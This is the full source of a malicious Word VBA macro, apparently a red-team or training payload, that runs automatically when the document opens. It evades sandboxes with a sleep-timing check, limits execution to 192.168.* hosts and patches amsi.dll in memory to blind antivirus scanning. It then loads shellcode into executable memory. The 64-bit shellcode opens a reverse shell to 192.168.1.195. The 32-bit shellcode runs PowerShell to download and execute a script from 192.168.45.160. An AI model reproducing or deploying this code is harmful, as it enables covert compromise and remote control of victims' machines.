'av / 4msi
Type MODULEINFO
  lpBaseOfDLL As Long
  SizeOfImage As Long
  EntryPoint As Long
End Type
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Public Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
Public Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr
'std
Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
'run
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Function MyMacro()
    'Get current time, sleep 4 seconds, get time again.  If less than 4 seconds have passed, assume we are in a AV sandbox and exit without running rest of macro.
    Dim myTime
    Dim Timein As Date
    Dim second_time
    Dim Timeout As Date
    Dim subtime As Variant
    Dim vOut As Integer

    myTime = Time
    Timein = Date + myTime
    Sleep (4000)
    second_time = Time
    Timeout = Date + second_time
    subtime = DateDiff("s", Timein, Timeout)
    vOut = CInt(subtime)
    If subtime < 3.5 Then
        Exit Function
    End If
    
    'initialize variables
    Dim Is64 As Boolean
    Dim StrFile As String
    Dim check As Boolean
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As LongPtr
    Dim data As String
    Dim res As LongPtr
    Dim ipcheck As Boolean
    ipcheck = False
    Dim inscope As String
    'define in scope IP's.  We can use wildcards here.
    inscope = "192.168.*"
    'Call ip check function.  Returns True if machine IP is in scope. If True, pass.  If False, exit.
    ipcheck = getMyIP(inscope)
    If ipcheck Then
    Else
        Exit Function
    End If

    'Dynamically resolve amsi.dll
    StrFile = Dir("c:\windows\system32\a?s?.d*")
    'Call architecture function to determine if we are in 32 bit or 64 bit word. 64 bit returns True.
    Is64 = arch()
    'Call amsi check function to determine if amsi.dll is loaded into Word. This is the case in word 2019+. Returns True if Amsi is found.
    check = amcheck(StrFile)
    
    'If amsi is found, call amsi patching function.  Pass architecture of Word as additional arg to function.
    If check Then
        patch StrFile, Is64
    End If

    'Include shellcode for both x86 and x64.
    If Is64 Then
        buf = Array(72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 81, 72, 139, 82, 32, 86, 72, 15, 183, 74, 74, 72, 139, 114, 80, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
        11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 68, 139, 64, 32, 139, 72, 24, 73, 1, 208, 227, 86, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 65, 193, 201, 13, 172, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, _
        208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 73, 190, 119, 115, 50, 95, 51, 50, 0, 0, 65, 86, 73, 137, 230, 72, 129, 236, 160, 1, 0, 0, 73, 137, 229, 73, _
        188, 2, 0, 1, 187, 192, 168, 1, 195, 65, 84, 73, 137, 228, 76, 137, 241, 65, 186, 76, 119, 38, 7, 255, 213, 76, 137, 234, 104, 1, 1, 0, 0, 89, 65, 186, 41, 128, 107, 0, 255, 213, 106, 10, 65, 94, 80, 80, 77, 49, 201, 77, 49, 192, 72, 255, 192, 72, 137, 194, 72, 255, 192, 72, 137, 193, 65, 186, 234, 15, 223, 224, 255, 213, 72, 137, 199, 106, 16, 65, _
        88, 76, 137, 226, 72, 137, 249, 65, 186, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 73, 255, 206, 117, 229, 232, 147, 0, 0, 0, 72, 131, 236, 16, 72, 137, 226, 77, 49, 201, 106, 4, 65, 88, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 85, 72, 131, 196, 32, 94, 137, 246, 106, 64, 65, 89, 104, 0, 16, 0, 0, 65, 88, 72, 137, 242, _
        72, 49, 201, 65, 186, 88, 164, 83, 229, 255, 213, 72, 137, 195, 73, 137, 199, 77, 49, 201, 73, 137, 240, 72, 137, 218, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 65, 87, 89, 104, 0, 64, 0, 0, 65, 88, 106, 0, 90, 65, 186, 11, 47, 15, 48, 255, 213, 87, 89, 65, 186, 117, 110, 77, 97, 255, 213, 73, 255, 206, 233, 60, 255, _
        255, 255, 72, 1, 195, 72, 41, 198, 72, 133, 246, 117, 180, 65, 255, 231, 88, 106, 0, 89, 187, 224, 29, 42, 10, 65, 137, 218, 255, 213)
    Else
        buf = Array(252,232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _
        207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,106,1,141,133,178,0,0,0,80,104,49,139,111,135,255,213,187,224,29,42,10,104,166,149, _
        189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213,112,111,119,101,114,115,104,101,108,108,46,101,120,101,32,45,99,32,40,110,101,119,45,111,98,106,101,99,116,32,110,101,116,46,119,101,98,99,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105, _
        110,103,40,39,104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,52,53,46,49,54,48,47,69,120,101,99,116,101,115,116,39,41,0)
    End If

    'Create new space in memory within current process
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    'Copy shellcode to newly created memory
    For counter = LBound(buf) To UBound(buf)
        data = Hex(buf(counter))
        patched ByVal (addr + counter), 1, ByVal ("&H" & data)
    Next counter
    'create thread to execute shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Function arch() As Boolean
 'check architecture of current word process
    #If Win64 Then
        arch = True
    #Else
        arch = False
    #End If
End Function

Public Function getMyIP(ipcheck As String) As Boolean
'uses WMI to get all IP's associated with machine.  Each one is then checked against the wildcarded IP/network.  If a match is found, returns True
    Dim objWMI As Object
    Dim objQuery As Object
    Dim objQueryItem As Object
    Dim vIpAddress
    Dim counter As Integer
    Dim ips() As String
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set objQuery = objWMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
    For Each objQueryItem In objQuery
        For Each vIpAddress In objQueryItem.ipaddress
            If CStr(vIpAddress) Like ipcheck Then
                getMyIP = True
            End If
        Next
    Next
End Function

Function amcheck(StrFile As String) As Boolean
    'Checks for amsi.dll in word process. If found, returns True
    Dim szProcessName As String
    Dim mdi As MODULEINFO
    Dim hMod(0 To 1023) As LongPtr
    Dim res As LongPtr
    amcheck = False
    res = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &H3)
    For i = 0 To UBound(hMod)
        szProcessName = String$(50, 0)
        GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
        If Left(szProcessName, 8) = StrFile Then
            amcheck = True
    End If
    Next i
End Function

Function patch(StrFile As String, Is64 As Boolean)
    'patches amsi.dll in memory in order to disable it.  Loads memory address of amsi.dll and then locates the AmsiUacInitialize function within it.  The AmsiScanBuffer and AmsiScanString functions are located via relative offset from AmsiUacInitialize and then overwritten with a nop and then a ret to disable them. 
    ' Depending on architecture these offsets vary, so a case is included for x86 and x64
    Dim lib As LongPtr
    Dim Func_addr As LongPtr
    Dim temp As LongPtr
    Dim old As LongPtr
    Dim off As Integer

    lib = getmod(StrFile)

    If Is64 Then
        off = 96
    Else
        off = 80
    End If
    
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, 0)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)

    If Is64 Then
        off = 352
    Else
        off = 256
    End If

    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, old)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)
End Function

'macro name is test which calls the main method
Sub test()
    MyMacro
End Sub

Sub Document_Open()
    test
End Sub
Sub AutoOpen()
    test
End Sub